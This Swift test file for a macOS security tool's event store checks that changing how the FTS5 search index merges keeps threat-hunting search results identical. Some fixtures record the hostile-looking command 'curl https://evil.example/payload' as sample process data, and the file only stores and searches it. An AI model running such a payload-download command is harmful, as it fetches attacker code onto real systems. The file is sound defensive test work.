// EventStoreFTSMergeTests.swift
// v1.21.4 Tier-A per-event CPU optimization — FTS5 automerge deferred off
// the hot insert path; explicit off-path ('merge', N) crank.
//
// These pin the DETECTION-SAFETY contract of the change:
//   - events_fts is read ONLY by search() (threat hunting). Deferring the
//     per-insert segment merge (automerge 4 → 16) and compacting the index
//     off-path must NOT change which rows a MATCH returns.
//   - search() must find inserted events both BEFORE and AFTER an explicit
//     merge, with identical results.
//   - The automerge=16 deferral must actually be applied (persisted in the
//     FTS5 %_config shadow table).
//   - mergeFTS() succeeds on a writable store and no-ops on a read-only one.

import Testing
import Foundation
import CSQLCipher
@testable import MacCrabCore

@Suite("EventStore: FTS5 automerge deferral + off-path merge (v1.21.4 Tier-A)")
struct EventStoreFTSMergeTests {

    // MARK: - Helpers (mirror EventStoreAiToolFallbackTests)

    private static func tempPath() -> String {
        FileManager.default.temporaryDirectory
            .appendingPathComponent("fts-merge-\(UUID().uuidString).db").path
    }

    private static func makeProcess(
        name: String,
        path: String,
        commandLine: String
    ) -> MacCrabCore.ProcessInfo {
        MacCrabCore.ProcessInfo(
            pid: 4242,
            ppid: 100,
            rpid: 4242,
            name: name,
            executable: path,
            commandLine: commandLine,
            args: commandLine.split(separator: " ").map(String.init),
            workingDirectory: "/Users/alice/project",
            userId: 501,
            userName: "alice",
            groupId: 20,
            startTime: Date(),
            codeSignature: nil,
            ancestors: [],
            architecture: "arm64",
            isPlatformBinary: false,
            hashes: nil,
            session: nil
        )
    }

    private static func makeEvent(
        name: String,
        path: String,
        commandLine: String
    ) -> Event {
        Event(
            eventCategory: .process,
            eventType: .start,
            eventAction: "exec",
            process: makeProcess(name: name, path: path, commandLine: commandLine)
        )
    }

    /// Read the persisted FTS5 `automerge` config value from the
    /// `events_fts_config` shadow table. Returns nil if unset/absent.
    private static func readAutomergeConfig(at path: String) -> Int? {
        var db: OpaquePointer?
        defer { if let d = db { sqlite3_close(d) } }
        guard sqlite3_open_v2(path, &db, SQLITE_OPEN_READONLY, nil) == SQLITE_OK,
              let db else { return nil }
        var stmt: OpaquePointer?
        defer { sqlite3_finalize(stmt) }
        guard sqlite3_prepare_v2(db, "SELECT v FROM events_fts_config WHERE k = 'automerge'", -1, &stmt, nil) == SQLITE_OK,
              sqlite3_step(stmt) == SQLITE_ROW else {
            return nil
        }
        return Int(sqlite3_column_int64(stmt, 0))
    }

    // MARK: - Tests

    @Test("automerge is deferred to 16 in the FTS5 %_config shadow table")
    func automergeConfiguredToSixteen() async throws {
        let path = Self.tempPath()
        defer { try? FileManager.default.removeItem(atPath: path) }
        let store = try EventStore(path: path)
        // Insert at least one row so the FTS index (and its config) materialize.
        try await store.insert(event: Self.makeEvent(
            name: "curl", path: "/usr/bin/curl",
            commandLine: "curl https://evil.example/payload"
        ))
        #expect(Self.readAutomergeConfig(at: path) == 16)
    }

    @Test("search() finds inserted events BEFORE any explicit merge")
    func searchFindsEventsPreMerge() async throws {
        let path = Self.tempPath()
        defer { try? FileManager.default.removeItem(atPath: path) }
        let store = try EventStore(path: path)

        try await store.insert(event: Self.makeEvent(
            name: "curl", path: "/usr/bin/curl",
            commandLine: "curl https://evil.example/payload"
        ))
        try await store.insert(event: Self.makeEvent(
            name: "ls", path: "/bin/ls",
            commandLine: "ls -la"
        ))

        // No mergeFTS() called yet — the deferred-automerge index must still
        // return exactly the matching row.
        let hits = try await store.search(text: "evil.example", limit: 10)
        #expect(hits.count == 1)
        #expect(hits.first?.process.name == "curl")
    }

    @Test("mergeFTS() succeeds and search() returns identical results after merge")
    func mergeSucceedsAndSearchUnchanged() async throws {
        let path = Self.tempPath()
        defer { try? FileManager.default.removeItem(atPath: path) }
        let store = try EventStore(path: path)

        // Insert enough distinct rows (each an autocommit txn ⇒ its own FTS
        // segment) that the deferred index actually accumulates segments to
        // merge — this exercises the real off-path compaction.
        for i in 0..<40 {
            try await store.insert(event: Self.makeEvent(
                name: "proc\(i)",
                path: "/usr/bin/proc\(i)",
                commandLine: "proc\(i) --flag needlebeacon\(i % 3)"
            ))
        }

        // Baseline result set (pre-merge).
        let preHits = try await store.search(text: "needlebeacon0", limit: 100)
        #expect(!preHits.isEmpty)
        let preNames = Set(preHits.map { $0.process.name })

        // Off-path compaction crank succeeds.
        let merged = await store.mergeFTS(pages: 64)
        #expect(merged)

        // A second no-op merge is still safe (nothing left to merge).
        let mergedAgain = await store.mergeFTS(pages: 64)
        #expect(mergedAgain)

        // DETECTION-SAFE contract: identical MATCH result set after merge.
        let postHits = try await store.search(text: "needlebeacon0", limit: 100)
        let postNames = Set(postHits.map { $0.process.name })
        #expect(postNames == preNames)
        #expect(postHits.count == preHits.count)
    }

    @Test("mergeFTS() on a read-only store is a no-op returning false")
    func mergeNoOpOnReadOnlyStore() async throws {
        let path = Self.tempPath()
        defer {
            try? FileManager.default.removeItem(atPath: path)
            try? FileManager.default.removeItem(atPath: path + "-wal")
            try? FileManager.default.removeItem(atPath: path + "-shm")
        }
        // Create + populate via a writable store first so the file exists.
        // Checkpoint the WAL into the main DB before dropping the writer so the
        // read-only connection reads cleanly without depending on WAL/-shm.
        do {
            let rw = try EventStore(path: path)
            try await rw.insert(event: Self.makeEvent(
                name: "curl", path: "/usr/bin/curl",
                commandLine: "curl https://evil.example/payload"
            ))
            await rw.walCheckpoint()
        }
        // Open a read-only connection and confirm the merge is refused.
        let ro = try EventStore(path: path, forceReadOnly: true)
        let merged = await ro.mergeFTS()
        #expect(merged == false)
        // The read-only connection can still search (read path unaffected).
        let hits = try await ro.search(text: "evil.example", limit: 10)
        #expect(hits.count == 1)
    }
}
